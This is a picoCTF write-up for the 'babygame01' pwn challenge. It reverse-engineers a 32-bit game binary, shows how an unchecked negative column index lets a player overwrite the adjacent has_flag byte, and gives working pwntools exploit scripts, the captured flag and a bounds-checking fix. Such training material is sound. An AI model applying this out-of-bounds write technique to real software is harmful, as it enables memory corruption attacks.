# babygame01 - picoCTF Writeup

## Challenge Information

**Challenge:** babygame01  
**Category:** Binary Exploitation (Pwn)  
**Platform:** picoCTF  
**Description:**
```
Get the flag and reach the exit. Welcome to BabyGame! Navigate around the map and see what 
you can find! The game is available to download here. There is no source available, so 
you'll have to figure your way around the map.

Connection: nc saturn.picoctf.net 56421
```

---

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Static Analysis](#static-analysis)
3. [Vulnerability Discovery](#vulnerability-discovery)
4. [Exploitation Strategy](#exploitation-strategy)
5. [Exploit Development](#exploit-development)
6. [Flag Capture](#flag-capture)
7. [Technical Deep Dive](#technical-deep-dive)
8. [Lessons Learned](#lessons-learned)

---

## Reconnaissance

### File Analysis

```bash
$ file game
game: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, 
interpreter /lib/ld-linux.so.2, BuildID[sha1]=02a3bb43121b1f6fbc2ab9154ab38a9427e19149, 
for GNU/Linux 3.2.0, not stripped
```

**Key Properties:**
- **Architecture:** 32-bit x86 (Intel 80386)
- **Format:** ELF executable
- **Linking:** Dynamically linked
- **Symbols:** Not stripped (debugging symbols present)

### Security Protections

```bash
$ checksec --file=game
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH
```

**Protection Analysis:**

| Protection | Status | Impact |
|------------|--------|--------|
| RELRO | Partial | GOT partially writable |
| Stack Canary | Enabled | Stack overflow detection active |
| NX | Enabled | Stack not executable (no shellcode) |
| PIE | Disabled | Fixed addresses (predictable layout) |
| FORTIFY | No | No additional buffer protections |

**Exploitation Implications:**
- Stack canary prevents traditional buffer overflow exploitation
- NX prevents shellcode execution on stack
- No PIE means addresses are predictable across runs
- Must find alternative vulnerability beyond stack overflow

### Function Discovery

```bash
$ gdb ./game
gef➤ info functions

Non-debugging symbols:
0x08049233  win
0x080492c8  init_map
0x0804936e  find_player_pos
0x080493e4  find_end_tile_pos
0x08049454  print_flag_status
0x0804948a  print_map
0x0804953a  init_player
0x08049564  move_player
0x08049639  clear_screen
0x08049677  solve_round
0x08049764  main
```

**Critical Functions:**
- `main()` - Entry point and game loop
- `win()` - Reads and prints flag from file
- `move_player()` - Handles player movement (likely vulnerable)
- `init_player()` - Initializes player structure
- `init_map()` - Sets up game map

### Strings Analysis

```bash
$ strings game | grep -i flag
flag.txt
flag.txt not found in current directory
Player has flag: %d
```

This confirms the binary reads from `flag.txt` and tracks a "has flag" state.

---

## Static Analysis

### Analyzing main()

Using Ghidra to decompile `main()`:

```c
int main(void) {
    int local_aac;              // player.row
    int local_aa8;              // player.col
    char local_aa4;             // player.has_flag
    undefined local_aa0[2700];  // map[30][90]
    int local_14;               // stack canary
    
    local_14 = *(int *)(in_GS_OFFSET + 0x14);  // Load canary
    
    init_player(&local_aac);
    init_map(local_aa0, &local_aac);
    print_map(local_aa0, &local_aac);
    signal(2, sigint_handler);
    
    do {
        do {
            iVar1 = getchar();
            move_player(&local_aac, (int)(char)iVar1, local_aa0);
            print_map(local_aa0, &local_aac);
        } while (local_aac != 0x1d);
    } while (local_aa8 != 0x59);
    
    puts("You win!");
    if (local_aa4 != '\0') {
        puts("flage");
        win();
        fflush(stdout);
    }
    
    if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
        __stack_chk_fail_local();
    }
    return 0;
}
```

**Stack Layout (from offsets):**

```
Address        | Variable          | Size      | Initial Value
---------------+-------------------+-----------+---------------
ebp-0xaac      | player.row        | 4 bytes   | 4
ebp-0xaa8      | player.col        | 4 bytes   | 4
ebp-0xaa4      | player.has_flag   | 1 byte    | 0  ← TARGET
ebp-0xaa3      | padding           | 3 bytes   |
ebp-0xaa0      | map[0][0]         | 2700 B    | ← MAP BASE
               | map array         |           |
ebp-0xc        | stack canary      | 4 bytes   |
```

**Player Structure:**
```c
struct player {
    int row;       // offset 0
    int col;       // offset 4
    char has_flag; // offset 8
};
```

**Win Conditions:**
1. Player must reach position (0x1d, 0x59) = (29, 89)
2. `player.has_flag` must be non-zero (any value except 0)
3. Both conditions trigger call to `win()`

### Analyzing win()

```c
void win(void) {
    FILE *__stream;
    int in_GS_OFFSET;
    char local_4c[60];
    int local_10;
    
    local_10 = *(int *)(in_GS_OFFSET + 0x14);
    __stream = fopen("flag.txt", "r");
    if (__stream == NULL) {
        puts("flag.txt not found in current directory");
        exit(0);
    }
    fgets(local_4c, 0x3c, __stream);
    printf(local_4c);  // Format string vuln (not exploited here)
    
    if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
        __stack_chk_fail_local();
    }
    return;
}
```

**Function Behavior:**
- Opens `flag.txt` for reading
- Reads up to 60 bytes into buffer
- Prints buffer contents (contains flag)
- Note: `printf(buffer)` is a format string vulnerability, but not needed for this challenge

### Analyzing move_player()

```c
void move_player(int *param_1, char param_2, int param_3) {
    int iVar1;
    
    // Command: 'l' - Set player_tile character
    if (param_2 == 'l') {
        iVar1 = getchar();
        player_tile = (undefined)iVar1;
    }
    
    // Command: 'p' - Auto-solve mode
    if (param_2 == 'p') {
        solve_round(param_3, param_1);
    }
    
    // Clear old position (write '.')
    *(undefined *)(*param_1 * 0x5a + param_3 + param_1[1]) = 0x2e;
    
    // Update coordinates based on direction
    if (param_2 == 'w') {
        *param_1 = *param_1 + -1;      // row-- (move up)
    }
    else if (param_2 == 's') {
        *param_1 = *param_1 + 1;       // row++ (move down)
    }
    else if (param_2 == 'a') {
        param_1[1] = param_1[1] + -1;  // col-- (move left)
    }
    else if (param_2 == 'd') {
        param_1[1] = param_1[1] + 1;   // col++ (move right)
    }
    
    // Write player_tile to new position
    *(undefined *)(*param_1 * 0x5a + param_3 + param_1[1]) = player_tile;
    return;
}
```

**Function Parameters:**
- `param_1` - Pointer to player struct (row, col, has_flag)
- `param_2` - Input character (command)
- `param_3` - Map base address

**Commands:**
- `w` - Move up (row--)
- `s` - Move down (row++)
- `a` - Move left (col--)
- `d` - Move right (col++)
- `l` - Set player tile character (followed by one character input)
- `p` - Auto-solve to exit

**Address Calculation for Map Write:**
```c
address = param_1[0] * 0x5a + param_3 + param_1[1]
address = row * 90 + map_base + col
```

Where `0x5a` = 90 decimal (number of columns in map)

---

## Vulnerability Discovery

### The Critical Bug: No Bounds Checking

The vulnerability is in `move_player()`:

```c
*(unsigned char *)(row * 0x5a + map_base + col) = player_tile;
```

**Problem:** No validation that coordinates are within valid ranges!

```c
// This check does NOT exist anywhere:
if (row < 0 || row >= 30 || col < 0 || col >= 90) {
    puts("Invalid move!");
    return;
}
```

**Consequences:**
- `row` and `col` are signed integers (can be negative)
- Negative values cause address calculation to go backwards
- Can write to memory BEFORE the map buffer
- Adjacent structure member `has_flag` is vulnerable

### Memory Layout Analysis

**Stack frame layout:**

```
Lower addresses (stack grows downward)
↓
0x...aac  [4 bytes] player.row = 4
0x...aa8  [4 bytes] player.col = 4
0x...aa4  [1 byte]  player.has_flag = 0  ← OUR TARGET (map_base - 4)
0x...aa3  [3 bytes] padding
0x...aa0  [2700 B]  map[0][0]            ← MAP BASE ADDRESS
          [...]     map[0][1]
          [...]     map[0][2]
          [...]     ...
          [...]     map[29][89]
↑
Higher addresses
```

**Key observation:** `has_flag` is exactly 4 bytes before map base.

### Exploitation Mathematics

**Normal map access (row=4, col=4):**
```
address = map_base + (4 * 90) + 4
address = map_base + 360 + 4
address = map_base + 364  ✓ Valid map location
```

**Exploit with negative coordinate (row=0, col=-4):**
```
address = map_base + (0 * 90) + (-4)
address = map_base + 0 - 4
address = map_base - 4
address = &has_flag  ← We can write here!
```

**Proof:**
- `map_base` is at offset `ebp-0xaa0`
- `map_base - 4` is at offset `ebp-0xaa4`
- `has_flag` is at offset `ebp-0xaa4`
- Therefore: `map_base - 4 == &has_flag` ✓

### Attack Plan

1. **Set write value:** Use 'l' command to set `player_tile` to non-zero byte ('A')
2. **Navigate to (0, -4):** Trigger out-of-bounds write to `has_flag`
3. **Navigate to (29, 89):** Reach the exit tile
4. **Trigger win condition:** Both conditions met → `win()` called → flag printed

---

## Exploitation Strategy

### Step-by-Step Attack

**Initial State:**
- Player at (4, 4)
- `has_flag` = 0
- `player_tile` = '@' (default)

**Stage 1: Set player_tile**
```
Command: 'l' + 'A'
Result: player_tile = 'A' (0x41)
```

**Stage 2: Move to row 0**
```
Command: 'wwww' (4 times up)
Result: row changes 4 → 3 → 2 → 1 → 0
```

**Stage 3: Move to col -4 (THE EXPLOIT)**
```
Command: 'aaaaaaaa' (8 times left)
Result: col changes 4 → 3 → 2 → 1 → 0 → -1 → -2 → -3 → -4

During the final 'a' move (col: -3 → -4):
    write_address = map_base + (0 * 90) + (-4)
    write_address = map_base - 4
    write_address = &has_flag
    *write_address = 'A'
    
Result: has_flag = 0x41 ✓
```

**Stage 4: Navigate to exit**
```
Command: 'sssssssssssssssssssssssssssss' (29 times down)
Result: row changes 0 → 1 → 2 → ... → 29

Command: 'ddddd...' (93 times right)
Result: col changes -4 → -3 → -2 → ... → 89
```

**Stage 5: Win condition triggers**
```c
if (row == 29 && col == 89) {        // TRUE ✓
    puts("You win!");
    if (has_flag != 0) {              // TRUE (has_flag = 'A') ✓
        puts("flage");
        win();                        // FLAG PRINTED
    }
}
```

### Movement Calculation

From (4, 4) to (0, -4):
- Up moves: 4 - 0 = 4 → `wwww`
- Left moves: 4 - (-4) = 8 → `aaaaaaaa`

From (0, -4) to (29, 89):
- Down moves: 29 - 0 = 29 → `s` * 29
- Right moves: 89 - (-4) = 93 → `d` * 93

---

## Exploit Development

### Final Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'

def exploit():
    # Connect to remote server
    p = remote('saturn.picoctf.net', 56421)
    
    # Wait for initial map display (ends with 'X' exit tile)
    p.recvuntil(b'X')
    
    # Build complete payload
    payload = b'lA'           # Set player_tile to 'A' (non-zero)
    payload += b'wwww'        # Move up 4 times: row 4 → 0
    payload += b'aaaaaaaa'    # Move left 8 times: col 4 → -4 [EXPLOIT]
    payload += b's' * 29      # Move down 29 times: row 0 → 29
    payload += b'd' * 93      # Move right 93 times: col -4 → 89
    
    # Send all commands at once
    p.send(payload)
    
    # Receive and display output
    p.interactive()

if __name__ == '__main__':
    exploit()
```

### Alternative: Exploit with Timing

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'

def exploit():
    p = remote('saturn.picoctf.net', 56421)
    
    # Wait for initial map
    p.recvuntil(b'X')
    
    # Stage 1: Set player_tile to 'A'
    log.info("Stage 1: Setting player_tile to 'A'")
    p.send(b'l')
    sleep(0.1)
    p.send(b'A')
    sleep(0.1)
    
    # Stage 2: Move to (0, -4) - corrupts has_flag
    log.info("Stage 2: Moving to (0, -4) to corrupt has_flag")
    p.send(b'wwww')
    sleep(0.2)
    p.send(b'aaaaaaaa')
    sleep(0.2)
    
    # Stage 3: Navigate to exit (29, 89)
    log.info("Stage 3: Navigating to exit (29, 89)")
    p.send(b's' * 29)
    sleep(0.5)
    p.send(b'd' * 93)
    sleep(0.5)
    
    # Receive flag
    log.success("Retrieving flag...")
    p.interactive()

if __name__ == '__main__':
    exploit()
```

---

## Flag Capture

### Execution

```bash
$ python3 exploit.py
[+] Opening connection to saturn.picoctf.net on port 56421: Done
[*] Switching to interactive mode

[Map display showing player movement...]

You win!
flage
picoCTF{gamer_m0d3_enabled_f4f6ad7d}

[*] Got EOF while reading in interactive
[*] Closed connection to saturn.picoctf.net port 56421
```

### Flag

```
picoCTF{gamer_m0d3_enabled_f4f6ad7d}
```

---

## Technical Deep Dive

### Integer Underflow Mechanics

**What is Integer Underflow?**
When an integer value decreases below its minimum representable value.

**In this challenge:**
```c
int col = 4;
col = col - 1;  // col = 3
col = col - 1;  // col = 2
col = col - 1;  // col = 1
col = col - 1;  // col = 0
col = col - 1;  // col = -1  ← Underflow (still valid for signed int)
col = col - 1;  // col = -2
col = col - 1;  // col = -3
col = col - 1;  // col = -4
```

Since `col` is a signed integer, negative values are perfectly valid in C. The bug is not the negative value itself, but the **lack of validation** before using it in address calculations.

### Pointer Arithmetic with Negative Offsets

**Normal pointer arithmetic:**
```c
char *base = map;
char *position = base + 364;  // Points to map[364]
*position = '@';              // Write to map[364]
```

**Exploit using negative offset:**
```c
char *base = map;
char *position = base + (-4);  // Points to 4 bytes BEFORE map
*position = 'A';               // Write to has_flag (not map!)
```

**In assembly (simplified):**
```asm
; Calculate address: map_base + (row * 90) + col
mov eax, [ebp-0xaac]    ; Load row (0)
imul eax, 0x5a          ; Multiply by 90 → eax = 0
add eax, [ebp-0xaa0]    ; Add map_base address
add eax, [ebp-0xaa8]    ; Add col (-4) → eax = map_base - 4
mov byte [eax], 0x41    ; Write 'A' to calculated address
```

### Memory State Transitions

**Before exploitation:**
```
ebp-0xaac: [00 00 00 04]  player.row = 4
ebp-0xaa8: [00 00 00 04]  player.col = 4
ebp-0xaa4: [00]            player.has_flag = 0
ebp-0xaa3: [00 00 00]      padding
ebp-0xaa0: [2E 2E 2E ...]  map starts ('.' characters)
```

**After 'l' + 'A':**
```
Global player_tile variable = 0x41
(No change to stack yet)
```

**After 'wwww':**
```
ebp-0xaac: [00 00 00 00]  player.row = 0
ebp-0xaa8: [00 00 00 04]  player.col = 4
ebp-0xaa4: [00]            player.has_flag = 0
```

**After 'aaaaaaaa' (CRITICAL MOMENT):**
```
ebp-0xaac: [00 00 00 00]  player.row = 0
ebp-0xaa8: [FF FF FF FC]  player.col = -4 (0xFFFFFFFC in 2's complement)
ebp-0xaa4: [41]            player.has_flag = 'A' ← CORRUPTED!
```

**After reaching (29, 89):**
```
ebp-0xaac: [00 00 00 1D]  player.row = 29
ebp-0xaa8: [00 00 00 59]  player.col = 89
ebp-0xaa4: [41]            player.has_flag = 'A' ← Still set!
```

**Win condition check:**
```c
if (*(int *)(ebp-0xaac) == 0x1d &&    // TRUE: row == 29
    *(int *)(ebp-0xaa8) == 0x59) {    // TRUE: col == 89
    puts("You win!");
    if (*(char *)(ebp-0xaa4) != 0) {  // TRUE: has_flag == 'A'
        win();                         // FLAG PRINTED!
    }
}
```

### Why Stack Canary Doesn't Help

Stack canaries protect against **buffer overflows** that overwrite the return address. 

**Our exploit:**
- Does NOT overflow any buffer
- Does NOT touch the stack canary
- Does NOT modify return address
- Only corrupts an adjacent variable through calculated out-of-bounds write

The canary is placed between local variables and the saved return address:

```
[local variables]   ← We corrupt here
[stack canary]      ← Untouched
[saved ebp]
[return address]
```

### Vulnerability Classification

**CWE-787: Out-of-bounds Write**
- Writing data past the end (or before the start) of a buffer
- Can corrupt adjacent memory structures

**CWE-191: Integer Underflow**
- Integer value decreases below minimum bound
- Used in array indexing without validation

**Root Cause:**
Missing input validation in security-critical code path.

### Secure Coding Fix

**Vulnerable code:**
```c
void move_player(int *player, char direction, char *map) {
    // No validation!
    if (direction == 'a') player[1]--;
    
    // Unsafe write
    *(map + player[0] * 90 + player[1]) = player_tile;
}
```

**Fixed code:**
```c
#define MAP_ROWS 30
#define MAP_COLS 90

void move_player(int *player, char direction, char *map) {
    int new_row = player[0];
    int new_col = player[1];
    
    // Calculate new position
    if (direction == 'w') new_row--;
    else if (direction == 's') new_row++;
    else if (direction == 'a') new_col--;
    else if (direction == 'd') new_col++;
    
    // Validate bounds BEFORE applying move
    if (new_row < 0 || new_row >= MAP_ROWS || 
        new_col < 0 || new_col >= MAP_COLS) {
        puts("Invalid move - out of bounds!");
        return;
    }
    
    // Safe to update and write
    player[0] = new_row;
    player[1] = new_col;
    *(map + new_row * MAP_COLS + new_col) = player_tile;
}
```

---

## Lessons Learned

### Key Takeaways

1. **Always Validate Input Bounds**
   - Any user-controlled value used in address calculations must be validated
   - Check both upper AND lower bounds (don't forget negatives!)

2. **Understand Memory Layout**
   - Adjacent variables on the stack can be corrupted
   - Compiler-generated padding affects offset calculations
   - Use `pahole` or Ghidra to verify struct layouts

3. **Signed vs Unsigned Integers Matter**
   - Signed integers allow negative values (can underflow)
   - Unsigned integers wrap around (can overflow)
   - Choose appropriate type based on domain (coordinates should be unsigned!)

4. **Protections Have Limitations**
   - Stack canaries only protect return addresses
   - NX only prevents code execution on stack
   - ASLR/PIE only randomize addresses (not present here)
   - Multiple layers needed for defense in depth

5. **Binary Analysis Workflow**
   - Start with high-level: file type, protections, strings
   - Identify critical functions: win conditions, input handlers
   - Decompile and understand program logic
   - Map memory layout precisely
   - Calculate exact offsets for exploitation

### Real-World Implications

Similar vulnerabilities exist in:
- **Game engines:** Tile-based games, coordinate systems
- **Image processing:** Pixel coordinates, ROI calculations
- **Network protocols:** Offset fields in packet headers
- **Embedded systems:** Sensor data indexing, buffer management
- **Databases:** Query result indexing without bounds checking

### CTF Skills Developed

- Binary reverse engineering with Ghidra
- Stack layout analysis
- Integer underflow exploitation
- Out-of-bounds write techniques
- Pwntools scripting for exploit automation
- Memory corruption debugging

---

## References

### Vulnerability Research
- [CWE-787: Out-of-bounds Write](https://cwe.mitre.org/data/definitions/787.html)
- [CWE-191: Integer Underflow (Wrap or Wraparound)](https://cwe.mitre.org/data/definitions/191.html)
- [CWE-125: Out-of-bounds Read](https://cwe.mitre.org/data/definitions/125.html)

### Tools Used
- [Ghidra](https://ghidra-sre.org/) - NSA's reverse engineering framework
- [pwntools](https://github.com/Gallopsled/pwntools) - CTF exploit development framework
- [GDB with GEF](https://github.com/hugsy/gef) - Enhanced debugging
- [checksec](https://github.com/slimm609/checksec.sh) - Binary security property checker

### Further Reading
- "The Shellcoder's Handbook" - Buffer overflow techniques
- "Hacking: The Art of Exploitation" - Memory corruption fundamentals
- "A Guide to Kernel Exploitation" - Advanced exploitation techniques



